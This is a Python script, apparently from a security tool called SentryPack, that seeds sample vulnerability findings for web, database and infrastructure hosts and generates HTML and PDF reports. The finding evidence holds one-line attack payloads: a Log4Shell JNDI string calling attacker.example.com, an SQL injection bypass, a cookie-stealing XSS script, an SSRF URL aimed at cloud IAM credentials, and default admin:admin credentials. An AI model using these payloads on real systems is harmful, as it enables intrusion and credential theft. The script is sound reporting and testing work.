"""
Standalone verification script: seeds realistic sample data and generates
HTML + PDF vulnerability assessment reports.

Usage
-----
    python api/reporting/sample_report.py [--out-dir PATH]

Defaults to writing output into  <project-root>/reports/  which is
cross-platform (no /tmp dependency).
"""

from __future__ import annotations

import argparse
import logging
from pathlib import Path
import sys

# Ensure repository root is on sys.path when executed directly
_project_root = str(Path(__file__).resolve().parent.parent.parent)
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)

from api.db.models import FindingModel, Project, Target
from api.db.session import SessionLocal, init_db
from api.reporting.generator import ReportGenerator, _get_pdf_backend

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("sentrypack.reporting.sample")


# ---------------------------------------------------------------------------
# Realistic mixed finding data
# ---------------------------------------------------------------------------
# Covering the full offensive/defensive/recon spectrum across 3 targets.
# evidence["finding_type"] is used by the generator to attach the type badge.

_WEB_FINDINGS = [
    # ── Offensive ────────────────────────────────────────────────────────
    FindingModel(
        title="Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
        severity="Critical",
        cve="CVE-2021-44228",
        cpe="cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*",
        description=(
            "Apache Log4j2 ≤2.14.1 JNDI features used in configuration, log messages, "
            "and parameters do not protect against attacker-controlled LDAP and other "
            "JNDI-related endpoints, enabling unauthenticated remote code execution."
        ),
        remediation="Upgrade Apache Log4j to 2.17.1+; set log4j2.formatMsgNoLookups=true as interim mitigation.",
        evidence={
            "finding_type": "offensive",
            "payload": "${jndi:ldap://attacker.example.com/a}",
            "vulnerable_header": "X-Api-Version",
            "response_code": 200,
            "callback_received": True,
        },
    ),
    FindingModel(
        title="SQL Injection — User Login Endpoint",
        severity="Critical",
        cve="CVE-2023-45542",
        cpe=None,
        description=(
            "The /api/auth/login endpoint is vulnerable to error-based SQL injection "
            "via the 'username' parameter. Exploitation allows authentication bypass "
            "and full database dump."
        ),
        remediation="Use parameterised queries / prepared statements; validate and sanitise all user input.",
        evidence={
            "finding_type": "offensive",
            "parameter": "username",
            "payload": "' OR 1=1 --",
            "db_error_leaked": "You have an error in your SQL syntax",
            "endpoint": "POST /api/auth/login",
        },
    ),
    FindingModel(
        title="Reflected Cross-Site Scripting (XSS)",
        severity="High",
        cve="CVE-2023-28432",
        cpe=None,
        description=(
            "Unsanitised user input in the search query parameter 'q' is directly "
            "reflected in the HTML response, allowing arbitrary script execution in "
            "the victim's browser."
        ),
        remediation="Implement strict context-aware output encoding; enforce Content-Security-Policy headers.",
        evidence={
            "finding_type": "offensive",
            "parameter": "q",
            "injected": "<script>alert(document.cookie)</script>",
            "endpoint": "GET /search",
            "executed": True,
        },
    ),
    FindingModel(
        title="Server-Side Request Forgery (SSRF) — Webhook URL",
        severity="High",
        cve=None,
        cpe=None,
        description=(
            "The webhook configuration endpoint accepts arbitrary URLs without "
            "allowlist validation. An attacker can target internal services on the "
            "cloud metadata API (169.254.169.254) or other RFC-1918 addresses."
        ),
        remediation="Validate webhook URLs against a strict allowlist; block RFC-1918 and link-local ranges.",
        evidence={
            "finding_type": "offensive",
            "endpoint": "POST /api/integrations/webhook",
            "ssrf_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "response_code": 200,
            "sensitive_data": "IAM role credentials returned",
        },
    ),
    # ── Defensive ────────────────────────────────────────────────────────
    FindingModel(
        title="TLS 1.0 / 1.1 Protocol Enabled",
        severity="Medium",
        cve=None,
        cpe=None,
        description=(
            "The server accepts connections using deprecated TLS 1.0 and TLS 1.1 "
            "cipher suites, which are vulnerable to BEAST, POODLE, and CBC padding "
            "oracle attacks."
        ),
        remediation="Disable TLS 1.0 and TLS 1.1 in the web server configuration; enforce TLS 1.2 and TLS 1.3 only.",
        evidence={
            "finding_type": "defensive",
            "supported_protocols": ["TLSv1.0", "TLSv1.1", "TLSv1.2", "TLSv1.3"],
            "recommended_minimum": "TLSv1.2",
        },
    ),
    FindingModel(
        title="Missing Content-Security-Policy Header",
        severity="Low",
        cve=None,
        cpe=None,
        description=(
            "The application does not emit a Content-Security-Policy (CSP) header, "
            "making it easier for XSS attacks to succeed and load external resources."
        ),
        remediation="Add a restrictive CSP header. Start with 'default-src \\'self\\'' and tighten per section.",
        evidence={
            "finding_type": "defensive",
            "checked_url": "https://10.0.0.10/",
            "csp_header_present": False,
        },
    ),
    # ── Recon ────────────────────────────────────────────────────────────
    FindingModel(
        title="HTTP Server Banner Disclosure",
        severity="Info",
        cve=None,
        cpe=None,
        description=(
            "The HTTP response headers disclose the exact web server software and "
            "version (Apache/2.4.41), aiding attacker reconnaissance."
        ),
        remediation="Set 'ServerTokens Prod' and 'ServerSignature Off' in Apache configuration.",
        evidence={
            "finding_type": "recon",
            "server_header": "Apache/2.4.41 (Ubuntu)",
            "x_powered_by": "PHP/7.4.3",
        },
    ),
    FindingModel(
        title="Strict-Transport-Security (HSTS) Header Missing",
        severity="Info",
        cve=None,
        cpe=None,
        description=(
            "The web application does not transmit the Strict-Transport-Security "
            "HTTP response header, allowing connections to be downgraded to plain HTTP."
        ),
        remediation="Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' to all HTTPS responses.",
        evidence={
            "finding_type": "recon",
            "checked_url": "https://10.0.0.10/",
            "hsts_header_present": False,
        },
    ),
]

_DB_FINDINGS = [
    # ── Offensive ────────────────────────────────────────────────────────
    FindingModel(
        title="PostgreSQL Default / Blank Superuser Password",
        severity="Critical",
        cve="CVE-2019-9193",
        cpe="cpe:2.3:a:postgresql:postgresql:11.2:*:*:*:*:*:*:*",
        description=(
            "The PostgreSQL superuser account 'postgres' is configured with the "
            "default or blank credentials, permitting unauthenticated superuser access "
            "and arbitrary OS command execution via COPY TO/FROM PROGRAM."
        ),
        remediation="Set a strong unique password for the postgres user; configure pg_hba.conf to reject trust/peer auth.",
        evidence={
            "finding_type": "offensive",
            "user": "postgres",
            "auth_method": "trust",
            "status": "authenticated",
            "rce_vector": "COPY TO/FROM PROGRAM",
        },
    ),
    FindingModel(
        title="Unauthenticated Redis Exposure on Public Interface",
        severity="High",
        cve="CVE-2022-0543",
        cpe="cpe:2.3:a:redis:redis:6.2.6:*:*:*:*:*:*:*",
        description=(
            "Redis 6.2.6 is bound to 0.0.0.0:6379 with no authentication required. "
            "An attacker can read all cached data, overwrite keys, and escalate to "
            "RCE via Lua sandbox escape (CVE-2022-0543)."
        ),
        remediation="Bind Redis to 127.0.0.1; enable requirepass in redis.conf; upgrade to 7.0+.",
        evidence={
            "finding_type": "offensive",
            "port": 6379,
            "auth_required": False,
            "redis_version": "6.2.6",
            "lua_rce_poc_available": True,
        },
    ),
    # ── Defensive ────────────────────────────────────────────────────────
    FindingModel(
        title="Unencrypted Database Traffic Permitted",
        severity="Medium",
        cve=None,
        cpe=None,
        description=(
            "The PostgreSQL database service accepts plaintext connections without "
            "requiring SSL/TLS encryption, exposing credentials and data in transit."
        ),
        remediation="Enable 'ssl = on' in postgresql.conf and enforce 'hostssl' rules in pg_hba.conf.",
        evidence={
            "finding_type": "defensive",
            "ssl_required": False,
            "negotiated_ssl": False,
            "port": 5432,
        },
    ),
    FindingModel(
        title="Database Backups Stored Without Encryption",
        severity="Low",
        cve=None,
        cpe=None,
        description=(
            "Automated daily pg_dump backups are written to /var/backups/pg/ without "
            "encryption. Any local compromise grants full DB access."
        ),
        remediation="Encrypt backups at rest using GPG or AES-256; restrict /var/backups/pg/ to the postgres user.",
        evidence={
            "finding_type": "defensive",
            "backup_path": "/var/backups/pg/",
            "world_readable": True,
            "encrypted": False,
        },
    ),
]

_INFRA_FINDINGS = [
    # ── Offensive ────────────────────────────────────────────────────────
    FindingModel(
        title="SMB EternalBlue (MS17-010) Vulnerability",
        severity="Critical",
        cve="CVE-2017-0144",
        cpe="cpe:2.3:o:microsoft:windows_server_2008:r2:sp1:*:*:*:*:*:*",
        description=(
            "The SMB service on port 445 is vulnerable to EternalBlue (MS17-010), "
            "enabling unauthenticated remote code execution as SYSTEM. This is the "
            "same vector used by WannaCry and NotPetya ransomware."
        ),
        remediation="Apply MS17-010 patch; disable SMBv1; block inbound port 445 at the network perimeter.",
        evidence={
            "finding_type": "offensive",
            "port": 445,
            "protocol": "SMB",
            "smb_version": "SMBv1",
            "ms17_010_status": "VULNERABLE",
            "target_os": "Windows Server 2008 R2 SP1",
        },
    ),
    FindingModel(
        title="RDP Exposed Without Network Level Authentication (NLA)",
        severity="High",
        cve="CVE-2019-0708",
        cpe="cpe:2.3:o:microsoft:windows_server_2016:-:*:*:*:*:*:*:*",
        description=(
            "Remote Desktop Protocol (RDP) is exposed on port 3389 without Network "
            "Level Authentication enabled. BlueKeep (CVE-2019-0708) is a pre-auth RCE "
            "that exploits this configuration."
        ),
        remediation="Enable NLA for all RDP connections; apply KB4499175; restrict RDP access via VPN/jump host.",
        evidence={
            "finding_type": "offensive",
            "port": 3389,
            "nla_enabled": False,
            "bluekeep_poc": "public exploit available",
        },
    ),
    # ── Defensive ────────────────────────────────────────────────────────
    FindingModel(
        title="Default Administrator Credentials on Management Console",
        severity="Critical",
        cve=None,
        cpe=None,
        description=(
            "The internal management web console (port 8080) accepts the vendor "
            "default credentials admin:admin, granting full administrative access."
        ),
        remediation="Change all default passwords immediately; enforce MFA on admin console; restrict to management VLAN.",
        evidence={
            "finding_type": "defensive",
            "port": 8080,
            "tested_credentials": "admin:admin",
            "login_successful": True,
            "access_level": "Administrator",
        },
    ),
    FindingModel(
        title="Firewall Allows Unrestricted Outbound Traffic",
        severity="Medium",
        cve=None,
        cpe=None,
        description=(
            "The host firewall policy permits all outbound TCP connections to any "
            "destination, facilitating C2 callback, data exfiltration, and lateral "
            "movement."
        ),
        remediation="Implement allowlist-based egress filtering; restrict outbound to business-required ports and destinations.",
        evidence={
            "finding_type": "defensive",
            "outbound_policy": "ACCEPT all",
            "tested_destinations": ["attacker.example.com:4444", "8.8.8.8:9999"],
            "all_connections_succeeded": True,
        },
    ),
    # ── Recon ────────────────────────────────────────────────────────────
    FindingModel(
        title="Open Ports Enumeration",
        severity="Info",
        cve=None,
        cpe=None,
        description=(
            "Nmap SYN scan identified 6 open TCP ports. This information provides the "
            "baseline attack surface for further targeted assessment."
        ),
        remediation="Review each open service; close or firewall any ports not required for business operations.",
        evidence={
            "finding_type": "recon",
            "open_ports": [22, 80, 443, 445, 3389, 8080],
            "scan_type": "TCP SYN",
            "scan_duration_s": 12.4,
        },
    ),
]


# ---------------------------------------------------------------------------
# Main driver
# ---------------------------------------------------------------------------


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Generate SentryPack sample HTML + PDF vulnerability reports.",
    )
    parser.add_argument(
        "--out-dir",
        default=str(Path(_project_root) / "reports"),
        help="Output directory for the generated reports (default: <project-root>/reports/).",
    )
    return parser.parse_args()


def generate_sample_reports(out_dir: str) -> None:
    """Seed sample data and generate sample HTML & PDF vulnerability reports."""

    logger.info("PDF backend: %s", _get_pdf_backend())

    # 1. Ensure database and tables exist
    init_db()
    db = SessionLocal()

    try:
        # 2. Create or reuse Demo Project
        project = db.query(Project).filter(Project.name == "SentryPack Demo Report").first()
        if not project:
            project = Project(
                name="SentryPack Demo Report",
                description=(
                    "Comprehensive vulnerability assessment demo covering web, database, "
                    "and infrastructure targets.  Includes a realistic mix of offensive "
                    "(exploit-oriented), defensive (configuration/hardening), and recon "
                    "(informational) findings across all five severity levels."
                ),
            )
            db.add(project)
            db.commit()
            db.refresh(project)
            logger.info("Created project '%s' (id=%s)", project.name, project.id)
        else:
            logger.info("Reusing existing project '%s' (id=%s)", project.name, project.id)

        # 3. Create or reuse three targets
        def _get_or_create_target(name: str, ip: str, status: str = "active") -> Target:
            t = (
                db.query(Target)
                .filter(Target.project_id == project.id, Target.name == name)
                .first()
            )
            if not t:
                t = Target(project_id=project.id, name=name, ip_address=ip, status=status)
                db.add(t)
                db.commit()
                db.refresh(t)
            return t

        t_web   = _get_or_create_target("web-server-01",   "10.0.0.10", "active")
        t_db    = _get_or_create_target("db-server-01",    "10.0.0.20", "active")
        t_infra = _get_or_create_target("infra-server-01", "10.0.0.30", "active")

        # 4. Seed findings — clear previous demo data for a clean repeatable run
        target_ids = [t_web.id, t_db.id, t_infra.id]
        db.query(FindingModel).filter(
            FindingModel.target_id.in_(target_ids)
        ).delete(synchronize_session=False)
        db.commit()

        def _add_findings(target: Target, templates: list[FindingModel]) -> None:
            for tmpl in templates:
                finding = FindingModel(
                    target_id=target.id,
                    title=tmpl.title,
                    severity=tmpl.severity,
                    cve=tmpl.cve,
                    cpe=tmpl.cpe,
                    description=tmpl.description,
                    remediation=tmpl.remediation,
                    evidence=tmpl.evidence,
                )
                db.add(finding)
            db.commit()

        _add_findings(t_web,   _WEB_FINDINGS)
        _add_findings(t_db,    _DB_FINDINGS)
        _add_findings(t_infra, _INFRA_FINDINGS)

        total = len(_WEB_FINDINGS) + len(_DB_FINDINGS) + len(_INFRA_FINDINGS)
        logger.info(
            "Seeded %d findings across 3 targets (web=%d, db=%d, infra=%d)",
            total, len(_WEB_FINDINGS), len(_DB_FINDINGS), len(_INFRA_FINDINGS),
        )

        # 5. Instantiate generator and ensure output directory exists
        gen = ReportGenerator()
        out_path = Path(out_dir)
        out_path.mkdir(parents=True, exist_ok=True)

        html_out = out_path / "sample_report.html"
        pdf_out  = out_path / "sample_report.pdf"

        # 6. Render HTML
        html_content = gen.render_html(project, db)
        html_out.write_text(html_content, encoding="utf-8")
        logger.info("HTML report written: %s (%d bytes)", html_out, html_out.stat().st_size)

        # 7. Render PDF
        pdf_content = gen.render_pdf(project, db)
        pdf_out.write_bytes(pdf_content)
        logger.info("PDF report written:  %s (%d bytes)", pdf_out, pdf_out.stat().st_size)

        # 8. Summary
        print()
        print("=" * 60)
        print("  SentryPack Sample Report Generation — Complete")
        print("=" * 60)
        print(f"  HTML  : {html_out}  ({html_out.stat().st_size:,} bytes)")
        print(f"  PDF   : {pdf_out}  ({pdf_out.stat().st_size:,} bytes)")
        print(f"  Backend : {_get_pdf_backend()}")
        print(f"  Findings: {total} ({len(_WEB_FINDINGS)} web / {len(_DB_FINDINGS)} db / {len(_INFRA_FINDINGS)} infra)")
        print("=" * 60)

        # 9. Verify minimum sanity
        assert html_out.stat().st_size > 5000, "HTML too small — possible render error"
        assert pdf_out.stat().st_size > 1000, "PDF too small — possible render error"
        assert pdf_content.startswith(b"%PDF"), "PDF missing magic header"
        assert project.name in html_content, "Project name missing from HTML"
        logger.info("Sanity checks passed ✓")

    finally:
        db.close()


if __name__ == "__main__":
    args = parse_args()
    generate_sample_reports(args.out_dir)
